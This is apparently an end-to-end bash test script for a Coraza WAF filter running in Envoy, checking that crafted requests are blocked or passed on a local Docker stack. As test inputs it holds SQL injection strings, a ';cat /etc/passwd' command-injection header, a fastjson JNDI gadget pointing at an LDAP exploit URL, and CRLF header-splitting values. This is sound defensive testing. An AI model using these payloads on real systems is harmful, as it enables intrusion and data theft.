#!/usr/bin/env bash
# Copyright Coraza Kubernetes Operator contributors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

set -euo pipefail

repo_root=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/../.." && pwd)
script_dir="$repo_root/examples/envoy-coraza"
compose=(docker compose -f "$script_dir/compose.yaml" -p envoy-coraza-test)
temp_dir=$(mktemp -d)
# Interactive mode (ENVOY_CORAZA_INTERACTIVE=1) skips the assertions and leaves
# the stack running for manual requests.
interactive=${ENVOY_CORAZA_INTERACTIVE:-0}

cleanup() {
    local exit_code=$?
    trap - EXIT
    if (( exit_code != 0 )); then
        "${compose[@]}" logs --no-color envoy backend 2>&1 | tail --lines=60 >&2 || true
    fi
    "${compose[@]}" down --rmi local --volumes >/dev/null 2>&1 || true
    rm -rf "$temp_dir"
    exit "$exit_code"
}
trap cleanup EXIT

fail() {
    printf 'FAIL: %s\n' "$1" >&2
    exit 1
}

command -v python3 >/dev/null 2>&1 || fail 'python3 is required for chunked request trailers'

request() {
    local output=$1
    shift
    curl --silent --show-error --output "$output" --write-out '%{http_code}' "$@"
}

request_with_trailer() {
    local output=$1
    local headers=$2
    local trailer=$3
    local body=$4
    local url=$5
    python3 - "$output" "$headers" "$trailer" "$body" "$url" <<'PY'
import http.client
import sys
from urllib.parse import urlsplit

output_path, headers_path, trailer, body_path, raw_url = sys.argv[1:]
url = urlsplit(raw_url)
target = url.path or "/"
if url.query:
    target += "?" + url.query
with open(body_path, "rb") as body_file:
    body = body_file.read()
connection = http.client.HTTPConnection(url.hostname, url.port, timeout=10)
try:
    connection.putrequest("POST", target, skip_accept_encoding=True)
    connection.putheader("Content-Type", "application/x-www-form-urlencoded")
    connection.putheader("Transfer-Encoding", "chunked")
    connection.putheader("Trailer", "x-client-trailer")
    connection.putheader("Connection", "close")
    connection.endheaders()
    if body:
        connection.send(f"{len(body):X}\r\n".encode("ascii") + body + b"\r\n")
    connection.send(
        b"0\r\nx-client-trailer: " + trailer.encode("ascii") + b"\r\n\r\n"
    )
    response = connection.getresponse()
    with open(headers_path, "wb") as headers_file:
        headers_file.write(
            f"HTTP/1.1 {response.status} {response.reason}\r\n".encode("iso-8859-1")
        )
        for name, value in response.getheaders():
            headers_file.write(f"{name}: {value}\r\n".encode("iso-8859-1"))
        headers_file.write(b"\r\n")
    with open(output_path, "wb") as output_file:
        output_file.write(response.read())
    print(f"{response.status:03}")
finally:
    connection.close()
PY
}

abort_held_http1_request() {
    local url=$1
    python3 - "$url" <<'PY'
import select
import socket
import struct
import sys
import time
from urllib.parse import urlsplit

url = urlsplit(sys.argv[1])
target = url.path or "/"
if url.query:
    target += "?" + url.query
connection = socket.create_connection((url.hostname, url.port), timeout=10)
try:
    request = (
        f"POST {target} HTTP/1.1\r\n"
        f"Host: {url.netloc}\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: 4096\r\n"
        "Connection: close\r\n\r\n"
    ).encode("ascii")
    connection.sendall(request + b"partial")
    readable, _, _ = select.select([connection], [], [], 0.5)
    if readable and connection.recv(4096):
        raise RuntimeError("Envoy responded before the request body reached EOS")
    connection.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
finally:
    connection.close()
time.sleep(0.25)
PY
}

# Sends `GET <path>` with two `Host: <host>` headers, which curl cannot, and prints the status code.
duplicate_host_request() {
    local url=$1
    local host=$2
    python3 - "$url" "$host" <<'PY'
import socket
import sys
from urllib.parse import urlsplit

url = urlsplit(sys.argv[1])
host = sys.argv[2]
connection = socket.create_connection((url.hostname, url.port), timeout=10)
try:
    connection.sendall(
        f"GET {url.path} HTTP/1.1\r\nHost: {host}\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode("ascii")
    )
    response = b""
    while chunk := connection.recv(4096):
        response += chunk
finally:
    connection.close()
print(response.split(b" ", 2)[1].decode("ascii"))
PY
}

# Sends the request CRS rule 905110 exempts from inside the Envoy container, so that its TCP peer is 127.0.0.1, and
# prints the status code.
loopback_dummy_connection() {
    # shellcheck disable=SC2016 # $status expands in the container's shell.
    "${compose[@]}" exec -T envoy bash -c '
        exec 3<>/dev/tcp/127.0.0.1/10001
        printf "GET / HTTP/1.1\r\nHost: crs.local\r\nUser-Agent: curl/8 (internal dummy connection)\r\nCookie: session=1 UNION SELECT password FROM users--\r\nConnection: close\r\n\r\n" >&3
        read -r -t 10 _ status _ <&3
        printf %s "$status"'
}

# Sends a POST of 7 body bytes that rule 102 denies, but only the first 3, so that the filter holds the request, and
# waits for Envoy's request or stream idle timeout to answer it. Then sends the rest, and prints the status the client
# got and the seconds it waited for it.
held_request_until_timeout() {
    local url=$1
    python3 - "$url" <<'PY'
import socket
import sys
import time
from urllib.parse import urlsplit

url = urlsplit(sys.argv[1])
connection = socket.create_connection((url.hostname, url.port), timeout=90)
try:
    started = time.monotonic()
    connection.sendall(
        (
            f"POST {url.path} HTTP/1.1\r\nHost: {url.netloc}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 7\r\n\r\nq=b"
        ).encode("ascii")
    )
    response = connection.recv(4096)
    waited = time.monotonic() - started
    try:
        connection.sendall(b"lock")
        time.sleep(1)
    except OSError:
        pass
finally:
    connection.close()
status = response.split(b" ", 2)[1].decode("ascii") if response else "none"
print(f"{status} {waited:.0f}")
PY
}

# Requests what the filter refuses on the response path and checks that the client gets `expected` at once, with no
# byte of what the backend sent: a refused response must neither hang until Envoy's idle timeout nor leak.
check_refused_response() {
    local expected=$1
    local label=$2
    shift 2
    local result status seconds
    result=$(curl --silent --show-error --max-time 10 --output "$temp_dir/refused" \
        --dump-header "$temp_dir/refused-headers" --write-out '%{http_code} %{time_total}' "$@") \
        || fail "$label: the request failed"
    read -r status seconds <<<"$result"
    check_status "$expected" "$status" "$label"
    awk -v seconds="$seconds" 'BEGIN { exit !(seconds < 2) }' || fail "$label took ${seconds}s"
    if grep --quiet --ignore-case --fixed-strings --regexp=LEAK-MARKER --regexp=secret \
        "$temp_dir/refused" "$temp_dir/refused-headers"; then
        fail "$label leaked upstream response bytes"
    fi
}

check_status() {
    local expected=$1
    local actual=$2
    local label=$3
    [[ $actual == "$expected" ]] || fail "$label returned HTTP $actual, expected $expected"
}

backend_count() {
    local path=$1
    curl --silent --show-error --get --data-urlencode "path=$path" http://127.0.0.1:10001/__stats
}

envoy_logs() {
    "${compose[@]}" logs --no-color --no-log-prefix envoy 2>/dev/null || true
}

access_log_count() {
    envoy_logs | grep -c --fixed-strings 'coraza_observability' || true
}

require_access_log() {
    local expected=$1
    local before_count=$2
    for _attempt in {1..20}; do
        local latest
        local count
        latest=$(envoy_logs | grep --fixed-strings 'coraza_observability' | tail --lines=1 || true)
        count=$(access_log_count)
        if (( count > before_count )) && [[ $latest == *"$expected"* ]]; then
            return
        fi
        sleep 0.1
    done
    envoy_logs >"$temp_dir/envoy.log"
    fail "Envoy access log did not contain: $expected"
}

make_body_with_byte() {
    local destination=$1
    local size=$2
    local byte=$3
    head -c "$size" /dev/zero | tr '\000' "$byte" >"$destination"
}

require_log() {
    local expected=$1
    for _attempt in {1..20}; do
        if envoy_logs | grep --fixed-strings --quiet "$expected"; then
            return
        fi
        sleep 0.1
    done
    envoy_logs >"$temp_dir/envoy.log"
    fail "Envoy logs did not contain: $expected"
}

# Waits for the request to `path` to log rule `rule_id`. Rule logs reach stderr as
# each rule matches, unlike the access log, which Envoy flushes on a timer.
require_rule_log() {
    local path=$1
    local rule_id=$2
    for _attempt in {1..50}; do
        # No --quiet: an early exit would SIGPIPE the first grep and, under pipefail,
        # fail the pipeline whenever more lines for the path follow the match.
        if envoy_logs | grep --fixed-strings "[uri \"$path\"]" | grep --fixed-strings "[id \"$rule_id\"]" >/dev/null; then
            return
        fi
        sleep 0.1
    done
    envoy_logs >"$temp_dir/envoy.log"
    fail "rule $rule_id did not log for $path"
}

target_dir=${CARGO_TARGET_DIR:-"$repo_root/target"}
if [[ $target_dir != /* ]]; then
    target_dir="$repo_root/$target_dir"
fi
export ENVOY_CORAZA_WASM="$target_dir/wasm32-wasip1/release/envoy_coraza.wasm"
envoy_target=${ENVOY_CORAZA_MAKE_TARGET:-build-envoy-wasm}
make -C "$repo_root" "$envoy_target"
[[ -f $ENVOY_CORAZA_WASM ]] || fail "Wasm artifact is missing: $ENVOY_CORAZA_WASM"

# envoy-crs.yaml is the CRS variant of the fixture configuration: the same
# policies plus a "crs" policy for the crs.local authority. It only loads on a
# build with the embedded CRS, so the default run keeps envoy.yaml.
export ENVOY_CORAZA_CONFIG="$script_dir/envoy.yaml"
if [[ $envoy_target == build-envoy-wasm-crs ]]; then
    export ENVOY_CORAZA_CONFIG="$script_dir/envoy-crs.yaml"
fi

# Every setting envoy-coraza/README.md's "Required Envoy configuration" table says the example sets.
for setting in 'failure_policy: FAIL_CLOSED' 'allow_on_headers_stop_iteration: true' 'proxy_100_continue: false' \
    'use_remote_address: true' 'xff_num_trusted_hops: 0' 'strip_trailing_host_dot: true' 'strip_any_host_port: true' \
    'normalize_path: true' 'merge_slashes: true' 'path_with_escaped_slashes_action: REJECT_REQUEST' \
    'headers_with_underscores_action: REJECT_REQUEST' '- x-original-url' '- x-rewrite-url' \
    'stream_idle_timeout: 60s' 'request_timeout: 60s' 'per_connection_buffer_limit_bytes: 16777216' \
    'request_body_buffer_limit: 16777216'; do
    grep --quiet --fixed-strings --regexp="$setting" "$ENVOY_CORAZA_CONFIG" \
        || fail "$ENVOY_CORAZA_CONFIG lacks the required Envoy setting $setting"
done

"${compose[@]}" build backend
"${compose[@]}" run --rm --no-deps envoy --mode validate -c /etc/envoy/envoy.yaml
"${compose[@]}" up --detach

for _attempt in {1..60}; do
    status=$(curl --silent --output /dev/null --write-out '%{http_code}' http://127.0.0.1:9901/ready || true)
    [[ $status == 200 ]] && break
    sleep 1
done
[[ ${status:-} == 200 ]] || fail 'Envoy did not become ready'

if [[ $interactive == 1 ]]; then
    trap - EXIT
    rm -rf "$temp_dir"
    escaped_script_dir=$(printf '%q' "$script_dir")
    cat <<EOF
Envoy is up with the embedded CRS (crs.local authority).

    try:    curl -i -H 'Host: crs.local' 'http://127.0.0.1:10001/crs-sqli?q=1%27%20OR%201%3D1'
    expect: HTTP/1.1 403 Forbidden and [id "949110"] in the Envoy log

    logs:   docker compose -f $escaped_script_dir/compose.yaml -p envoy-coraza-test logs envoy
    stop:   docker compose -f $escaped_script_dir/compose.yaml -p envoy-coraza-test down --rmi local --volumes
EOF
    exit 0
fi

make_body_with_byte "$temp_dir/expected-pass" 16384 x
status=$(request "$temp_dir/pass" --request POST --header 'content-type: application/octet-stream' \
    --data-binary "@$temp_dir/expected-pass" http://127.0.0.1:10001/echo)
check_status 200 "$status" 'byte-exact benign pass-through'
cmp --silent "$temp_dir/expected-pass" "$temp_dir/pass" || fail 'benign request body changed in transit'
require_access_log 'path=/echo coraza_observability event=- rule_id=- phase=- action=- status=- reason=body_partially_inspected outcome=completed complete=false generation=1 request_truncated=true response_truncated=false telemetry_failed=false' 0

before=$(access_log_count)
status=$(request "$temp_dir/engine-off" --header 'Host: engineoff.local' http://127.0.0.1:10001/echo)
check_status 200 "$status" 'engine-off pass-through'
require_access_log 'path=/echo coraza_observability event=- rule_id=- phase=- action=- status=- reason=engine_off outcome=uninspected complete=false generation=1 request_truncated=false response_truncated=false telemetry_failed=false' \
    "$before"

status=$(request "$temp_dir/expect-pass" --expect100-timeout 1 --request POST \
    --header 'Expect: 100-continue' --header 'content-type: application/octet-stream' \
    --data-binary "@$temp_dir/expected-pass" http://127.0.0.1:10001/echo)
check_status 200 "$status" 'Expect: 100-continue pass-through'
cmp --silent "$temp_dir/expected-pass" "$temp_dir/expect-pass" \
    || fail 'Expect request body changed in transit'

before=$(backend_count /abort-held)
abort_held_http1_request http://127.0.0.1:10001/abort-held
[[ $(backend_count /abort-held) == "$before" ]] \
    || fail 'aborted held request reached the backend before EOS'
status=$(request "$temp_dir/abort-followup" http://127.0.0.1:10001/abort-held)
check_status 200 "$status" 'normal request after aborted held request'
[[ $(backend_count /abort-held) == "$((before + 1))" ]] \
    || fail 'normal request after abort was not received exactly once'

before=$(backend_count /phase1-deny)
status=$(request "$temp_dir/response" http://127.0.0.1:10001/phase1-deny)
check_status 403 "$status" 'phase-1 request denial'
[[ $(backend_count /phase1-deny) == "$before" ]] || fail 'phase-1 denied request reached the backend'

status=$(request "$temp_dir/response" http://127.0.0.1:10001/echo)
check_status 200 "$status" 'allowed stream after request denial'

# With use_remote_address, REMOTE_ADDR is the TCP peer: rule 106 denies 9.9.9.9, which a client can only claim.
status=$(request "$temp_dir/response" --header 'X-Forwarded-For: 9.9.9.9' http://127.0.0.1:10001/echo)
check_status 200 "$status" 'X-Forwarded-For does not choose REMOTE_ADDR'

# Envoy resolves dot segments and merges slashes before the rules see the path, so rule 101 matches.
for path in '/a/..;/phase1-deny' '//phase1-deny'; do
    before=$(backend_count /phase1-deny)
    status=$(request "$temp_dir/response" --path-as-is "http://127.0.0.1:10001$path")
    check_status 403 "$status" "phase-1 denial of $path"
    [[ $(backend_count /phase1-deny) == "$before" ]] || fail "$path reached the backend"
done

# A header name with an underscore is a different header to the rules and the same one to a CGI-style backend.
before=$(backend_count /underscore)
status=$(request "$temp_dir/response" --header 'X_Custom: 1' http://127.0.0.1:10001/underscore)
check_status 400 "$status" 'header name with an underscore'
[[ $(backend_count /underscore) == "$before" ]] || fail 'a header name with an underscore reached the backend'

# An authority that is no registered name is refused rather than decoded or matched to another policy.
before=$(backend_count /bad-authority)
status=$(request "$temp_dir/response" --header 'Host: reject%2elocal' http://127.0.0.1:10001/bad-authority)
check_status 400 "$status" 'percent-encoded authority'
status=$(duplicate_host_request http://127.0.0.1:10001/bad-authority reject.local)
check_status 400 "$status" 'two Host headers'
[[ $(backend_count /bad-authority) == "$before" ]] || fail 'an invalid authority reached the backend'

before=$(backend_count /phase1-deny)
# Envoy rejects HTTP/1.0 requests without Host before they reach the filter.
status=$(request "$temp_dir/no-authority" --http1.1 --header 'Host: unknown.local' \
    http://127.0.0.1:10001/phase1-deny)
check_status 403 "$status" 'unknown-authority default-policy fallback'
[[ $(backend_count /phase1-deny) == "$before" ]] \
    || fail 'request with unknown authority bypassed the default policy'

printf 'q=block' >"$temp_dir/deny-body"
before=$(backend_count /phase2-deny)
status=$(request "$temp_dir/response" --header 'content-type: application/x-www-form-urlencoded' \
    --data-binary "@$temp_dir/deny-body" http://127.0.0.1:10001/phase2-deny)
check_status 403 "$status" 'phase-2 request denial'
[[ $(backend_count /phase2-deny) == "$before" ]] || fail 'phase-2 denied request reached the backend'

for size in 31 32 33; do
    make_body_with_byte "$temp_dir/request-$size" "$size" a
    status=$(request "$temp_dir/response" --header 'content-type: application/x-www-form-urlencoded' \
        --data-binary "@$temp_dir/request-$size" http://127.0.0.1:10001/echo)
    check_status 200 "$status" "ProcessPartial request body at N=$size"

    status=$(request "$temp_dir/response" --header 'Host: reject.local' \
        --header 'content-type: application/x-www-form-urlencoded' \
        --data-binary "@$temp_dir/request-$size" http://127.0.0.1:10001/echo)
    expected=200
    (( size >= 32 )) && expected=413
    check_status "$expected" "$status" "Reject request body at N=$size"

    status=$(request "$temp_dir/response" "http://127.0.0.1:10001/bytes/$size")
    check_status 200 "$status" "ProcessPartial response body at N=$size"

    status=$(request "$temp_dir/response" --header 'Host: reject.local' \
        "http://127.0.0.1:10001/bytes/$size")
    expected=200
    (( size >= 32 )) && expected=500
    check_status "$expected" "$status" "Reject response body at N=$size"
done

# Another spelling of reject.local still selects its policy.
for host in reject.local. reject.local:1; do
    status=$(request "$temp_dir/response" --header "Host: $host" \
        --header 'content-type: application/x-www-form-urlencoded' \
        --data-binary "@$temp_dir/request-33" http://127.0.0.1:10001/echo)
    check_status 413 "$status" "Reject request body for Host: $host"
done

status=$(request "$temp_dir/response" --dump-header "$temp_dir/headers" \
    http://127.0.0.1:10001/response-deny)
check_status 502 "$status" 'phase-4 response body denial'
if grep --ignore-case --quiet -E '^(x-upstream-secret|set-cookie):' "$temp_dir/headers"; then
    fail 'response denial leaked an upstream sensitive header'
fi
if grep --quiet --fixed-strings 'secret' "$temp_dir/response"; then
    fail 'response denial leaked upstream body bytes'
fi

status=$(request "$temp_dir/response" --dump-header "$temp_dir/headers" \
    http://127.0.0.1:10001/empty)
check_status 200 "$status" 'header-only empty EOS'
[[ ! -s $temp_dir/response ]] || fail 'empty response acquired a body'

: >"$temp_dir/empty-request"
status=$(request_with_trailer "$temp_dir/response" "$temp_dir/headers" passed \
    "$temp_dir/empty-request" http://127.0.0.1:10001/echo)
check_status 200 "$status" 'empty request with trailer EOS'
grep --ignore-case --quiet '^x-client-trailer-seen: passed' "$temp_dir/headers" \
    || fail 'request trailer was not passed through to the backend'
[[ ! -s $temp_dir/response ]] || fail 'empty trailer-terminated request returned an unexpected body'

printf 'q=ok' >"$temp_dir/trailer-body"
status=$(request_with_trailer "$temp_dir/response" "$temp_dir/headers" passed \
    "$temp_dir/trailer-body" http://127.0.0.1:10001/echo)
check_status 200 "$status" 'request trailer pass-through'
grep --ignore-case --quiet '^x-client-trailer-seen: passed' "$temp_dir/headers" \
    || fail 'request trailer was not passed through to the backend'
cmp --silent "$temp_dir/trailer-body" "$temp_dir/response" || fail 'trailer request body changed in transit'

before=$(backend_count /phase2-deny)
status=$(request_with_trailer "$temp_dir/response" "$temp_dir/headers" denied \
    "$temp_dir/deny-body" http://127.0.0.1:10001/phase2-deny)
check_status 403 "$status" 'phase-2 denial on trailer-terminated request'
[[ $(backend_count /phase2-deny) == "$before" ]] || fail 'trailer-terminated denied request reached the backend'

status=$(request "$temp_dir/response" --dump-header "$temp_dir/headers" \
    http://127.0.0.1:10001/response-trailers)
check_status 200 "$status" 'response trailer EOS'
grep --ignore-case --quiet '^x-backend-trailer: passed' "$temp_dir/headers" \
    || fail 'response trailer was not passed through'
[[ $(cat "$temp_dir/response") == 'trailer response' ]] || fail 'response trailer body changed'

make_body_with_byte "$temp_dir/expected-large" 1048577 z
status=$(request "$temp_dir/response" --dump-header "$temp_dir/headers" \
    http://127.0.0.1:10001/large-uninspectable)
check_status 200 "$status" 'large MIME-excluded response'
cmp --silent "$temp_dir/expected-large" "$temp_dir/response" \
    || fail 'large MIME-excluded response was not byte-exact'
grep --ignore-case --quiet '^x-large-probe: preserved' "$temp_dir/headers" \
    || fail 'large MIME-excluded response header was not preserved'

status=$(request "$temp_dir/response" --dump-header "$temp_dir/headers" \
    --header 'Host: off.local' http://127.0.0.1:10001/large-uninspectable)
check_status 200 "$status" 'response body access off'
cmp --silent "$temp_dir/expected-large" "$temp_dir/response" \
    || fail 'response with body access off was not byte-exact'

status=$(request "$temp_dir/response" --dump-header "$temp_dir/headers" \
    http://127.0.0.1:10001/large-header-deny)
check_status 502 "$status" 'phase-4 response header denial for excluded body'
if grep --ignore-case --quiet -E '^(x-deny-response|x-large-probe):' "$temp_dir/headers"; then
    fail 'phase-4 denial leaked upstream response headers'
fi
if grep --quiet --fixed-strings 'LEAK-MARKER' "$temp_dir/response"; then
    fail 'phase-4 denial leaked upstream response body bytes'
fi

status=$(request "$temp_dir/response" --dump-header "$temp_dir/headers" \
    --header 'Host: off.local' http://127.0.0.1:10001/large-header-deny)
check_status 502 "$status" 'phase-4 response header denial with body access off'
if grep --ignore-case --quiet -E '^(x-deny-response|x-large-probe):' "$temp_dir/headers"; then
    fail 'phase-4 denial with body access off leaked upstream response headers'
fi
if grep --quiet --fixed-strings 'LEAK-MARKER' "$temp_dir/response"; then
    fail 'phase-4 denial with body access off leaked upstream response body bytes'
fi

# A response refused before its last body chunk is answered with a local reply at once. Envoy refused the in-place
# rewrite earlier builds attempted there, and its idle timer ended the stream.
check_refused_response 502 'HEAD of a response denied at its headers' --head http://127.0.0.1:10001/large-header-deny
check_refused_response 502 'denied 204' 'http://127.0.0.1:10001/status/204?deny=1'
check_refused_response 502 'denied 304' 'http://127.0.0.1:10001/status/304?deny=1'
check_refused_response 502 'denied empty 200' 'http://127.0.0.1:10001/text/0?deny=1'
check_refused_response 502 'compressed body of an inspected type' http://127.0.0.1:10001/gzip
check_refused_response 502 'phase-4 TX denial of a body that is not inspected' \
    --header 'Host: p4.local' http://127.0.0.1:10001/large-header-deny
check_refused_response 502 'inspected body of 1 MiB + 1 byte in 64 KiB writes' \
    'http://127.0.0.1:10001/text/1048577?chunk=65536'
status=$(request "$temp_dir/response" 'http://127.0.0.1:10001/text/1048576?chunk=65536')
check_status 200 "$status" 'inspected body of exactly 1 MiB in 64 KiB writes'
[[ $(stat --format=%s "$temp_dir/response") == 1048576 ]] || fail 'the 1 MiB body was not forwarded whole'

# Envoy answers a local reply to a gRPC request (content-type application/grpc) with HTTP 200 and a grpc-status, here
# 14 (UNAVAILABLE) for rule 104's 502, so a refused response keeps the status its rule chose only for plain HTTP.
# Rule 104 denies at the response headers; earlier builds rewrote such a response in place, and kept 502. A
# request-phase refusal also gives 200 with a grpc-status, but only a response-phase one carries this grpc-message.
check_refused_response 502 'phase-4 header denial of a plain HTTP response' 'http://127.0.0.1:10001/text/20?deny=1'
printf '\0\0\0\0\0' >"$temp_dir/grpc-message"
check_refused_response 200 'phase-4 header denial of a gRPC response' --http2-prior-knowledge --request POST \
    --header 'content-type: application/grpc' --header 'te: trailers' --data-binary "@$temp_dir/grpc-message" \
    'http://127.0.0.1:10001/text/20?deny=1'
grep --quiet --ignore-case '^grpc-status: 14' "$temp_dir/refused-headers" \
    || fail 'the refused gRPC response did not carry grpc-status 14'
grep --quiet --ignore-case '^grpc-message: Upstream response blocked' "$temp_dir/refused-headers" \
    || fail 'the refused gRPC response did not carry the response-phase grpc-message'

# A redirect target from a macro reaches the Location header percent-encoded, so CR and LF cannot split the reply.
for target in 'r?next=a%0d%0aSet-Cookie:%20x=1' 'status/200?deny=1&u=a%0d%0aSet-Cookie:%20x=1'; do
    check_refused_response 302 "redirect to a target with CR LF ($target)" \
        --header 'Host: redir.local' "http://127.0.0.1:10001/$target"
    [[ $(grep --count --ignore-case '^location:' "$temp_dir/refused-headers") == 1 ]] \
        || fail "redirect ($target) did not carry exactly one location header"
    if grep --quiet --ignore-case '^set-cookie:' "$temp_dir/refused-headers"; then
        fail "redirect ($target) split its headers"
    fi
    grep --quiet --ignore-case --fixed-strings 'location: /' "$temp_dir/refused-headers" \
        || fail "redirect ($target) lost its target"
done
grep --quiet --fixed-strings $'location: /blocked?u=a%0D%0ASet-Cookie: x=1\r' "$temp_dir/refused-headers" \
    || fail 'the response-side redirect target was not percent-encoded'

# A part with an empty header block, then a SQL injection in the next field: the
# multipart parser used to stop at the empty part, so no rule saw the injection.
printf '%b' "--X\r\n\r\nx\r\n--X\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n1' UNION SELECT password FROM users--\r\n--X--\r\n" \
    >"$temp_dir/empty-header-sqli"
# A multipart body without its final delimiter, which the engine cannot parse.
printf '%b' '--X\r\nContent-Disposition: form-data; name="q"\r\n\r\nunterminated' \
    >"$temp_dir/unterminated-multipart"

if [[ $envoy_target == build-envoy-wasm-crs ]]; then
    before=$(backend_count /crs-sqli)
    status=$(request "$temp_dir/response" --header 'Host: crs.local' \
        'http://127.0.0.1:10001/crs-sqli?q=1%27%20OR%20%271%27%3D%271')
    check_status 403 "$status" 'embedded CRS SQLi denial'
    [[ $(backend_count /crs-sqli) == "$before" ]] \
        || fail 'embedded CRS sent a denied request to the backend'
    require_log '[id "949110"]'

    # CRS rule 905110 removes every CRS rule for `GET /` from a loopback peer with a User-Agent ending in
    # "(internal dummy connection)". The embedded tree carries a stub in its place, so such a request is inspected:
    # with upstream's file this one would reach the backend. Rule 107 shows that the rules saw 127.0.0.1.
    before=$(backend_count /)
    status=$(loopback_dummy_connection)
    check_status 403 "$status" 'embedded CRS inspects a dummy connection from a loopback peer'
    require_rule_log / 107
    [[ $(backend_count /) == "$before" ]] || fail 'a loopback dummy connection reached the backend uninspected'

    # Nor can a client claim the loopback address in X-Forwarded-For.
    before=$(backend_count /)
    status=$(request "$temp_dir/response" --header 'Host: crs.local' --header 'X-Forwarded-For: 127.0.0.1' \
        --user-agent 'curl/8 (internal dummy connection)' \
        --cookie 'session=1 UNION SELECT password FROM users--' http://127.0.0.1:10001/)
    check_status 403 "$status" 'embedded CRS inspects a dummy connection that claims a loopback address'
    [[ $(backend_count /) == "$before" ]] || fail 'a dummy connection claiming loopback reached the backend uninspected'

    printf '{"name":"1%s OR %s1%s=%s1"}' "'" "'" "'" "'" >"$temp_dir/crs-json-sqli"
    before=$(backend_count /crs-json-sqli)
    status=$(request "$temp_dir/response" --header 'Host: crs.local' \
        --header 'Content-Type: application/json' \
        --data-binary "@$temp_dir/crs-json-sqli" http://127.0.0.1:10001/crs-json-sqli)
    check_status 403 "$status" 'embedded CRS JSON SQLi denial'
    [[ $(backend_count /crs-json-sqli) == "$before" ]] \
        || fail 'embedded CRS sent a denied JSON request to the backend'

    before=$(backend_count /crs-json-sqli-case)
    status=$(request "$temp_dir/response" --header 'Host: crs.local' \
        --header 'Content-Type: Application/JSON' \
        --data-binary "@$temp_dir/crs-json-sqli" http://127.0.0.1:10001/crs-json-sqli-case)
    check_status 403 "$status" 'embedded CRS mixed-case JSON SQLi denial'
    [[ $(backend_count /crs-json-sqli-case) == "$before" ]] \
        || fail 'embedded CRS sent a denied mixed-case JSON request to the backend'

    # The crs policy loads @crs-hardening-conf after the CRS rules. A command in a custom header, which the CRS
    # alone does not read, is scored and blocked, and a fastjson gadget class is denied by rule 10944130. A Safari
    # User-Agent (Version/17.2) passes: CRS rule 932180 matches `version` and must not read the header.
    before=$(backend_count /crs-header-payload)
    status=$(request "$temp_dir/response" --header 'Host: crs.local' --header 'X-Custom-Data: ;cat /etc/passwd' \
        http://127.0.0.1:10001/crs-header-payload)
    check_status 403 "$status" 'embedded CRS with the hardening supplement blocks a command in a custom header'
    require_rule_log /crs-header-payload 949110
    [[ $(backend_count /crs-header-payload) == "$before" ]] \
        || fail 'a command in a custom header reached the backend'

    printf '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://203.0.113.9:1389/Exploit","autoCommit":true}' \
        >"$temp_dir/crs-fastjson"
    before=$(backend_count /crs-fastjson)
    status=$(request "$temp_dir/response" --header 'Host: crs.local' --header 'Content-Type: application/json' \
        --data-binary "@$temp_dir/crs-fastjson" http://127.0.0.1:10001/crs-fastjson)
    check_status 403 "$status" 'embedded CRS with the hardening supplement denies a fastjson gadget'
    require_rule_log /crs-fastjson 10944130
    [[ $(backend_count /crs-fastjson) == "$before" ]] || fail 'a fastjson gadget reached the backend'

    status=$(request "$temp_dir/response" --header 'Host: crs.local' \
        --user-agent 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15' \
        http://127.0.0.1:10001/crs-safari)
    check_status 200 "$status" 'embedded CRS with the hardening supplement passes a Safari User-Agent'

    # Clients that rules of the CRS take for an attack when they read every header: a PowerShell User-Agent (rule
    # 932120) and an Origin with an IP address as host (rule 931100) pass; the supplement leaves these two rules off
    # these headers.
    status=$(request "$temp_dir/response" --header 'Host: crs.local' \
        --user-agent 'Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.22621.2506' \
        --header 'Origin: http://127.0.0.1:5173' http://127.0.0.1:10001/crs-powershell)
    check_status 200 "$status" 'embedded CRS with the hardening supplement passes a PowerShell User-Agent and an IP Origin'

    # The follow-up request of a page carries the page URL: a browser sends it as Referer with every subresource and link
    # click, a proxy in X-Forwarded-Uri. The page itself passes, so its follow-ups must pass too (rules 932235 and 932120
    # read the URL as free text if they read these headers).
    for page in '/search?q=ruby+on+rails+jobs' '/docs/powershell/getting-started?lang=en' '/search?q=python+list+comprehension'; do
        status=$(request "$temp_dir/response" --header 'Host: crs.local' "http://127.0.0.1:10001$page")
        check_status 200 "$status" "embedded CRS with the hardening supplement passes the page $page"
        status=$(request "$temp_dir/response" --header 'Host: crs.local' --header "Referer: http://crs.local$page" \
            http://127.0.0.1:10001/static/app.css)
        check_status 200 "$status" "embedded CRS with the hardening supplement passes a subresource of the page $page"
        status=$(request "$temp_dir/response" --header 'Host: crs.local' --header "X-Forwarded-Uri: $page" \
            http://127.0.0.1:10001/static/app.css)
        check_status 200 "$status" "embedded CRS with the hardening supplement passes a proxied request of the page $page"
        # htmx sends the page URL as HX-Current-URL with every request; oauth2-proxy and nginx auth_request send it as
        # X-Auth-Request-Redirect and X-Original-URI. Four rules do not read the headers of the supplement's list of page-URL
        # names (Referer, HX-Current-URL, X-Original-URL, X-Original-URI, X-Auth-Request-Redirect, ...); any other header
        # is read.
        for header in "HX-Current-URL: http://crs.local$page" "X-Original-URI: $page" "X-Auth-Request-Redirect: $page"; do
            status=$(request "$temp_dir/response" --header 'Host: crs.local' --header "$header" http://127.0.0.1:10001/items?page=2)
            check_status 200 "$status" "embedded CRS with the hardening supplement passes ${header%%:*} of the page $page"
        done
    done

    # Base64 file content in a JSON field is ordinary traffic: rule 10941100 decodes only a short value that is all base64
    # (the unchained rule denied 44 of 50 random files of 64 KiB, and the CRS alone none). The content is fixed: bytes of
    # Python's Mersenne Twister from a seed, so a run never meets the occasional random file that the CRS alone blocks
    # (about 2 percent of them). The seeds were checked to pass the CRS alone and the file; the last three files are
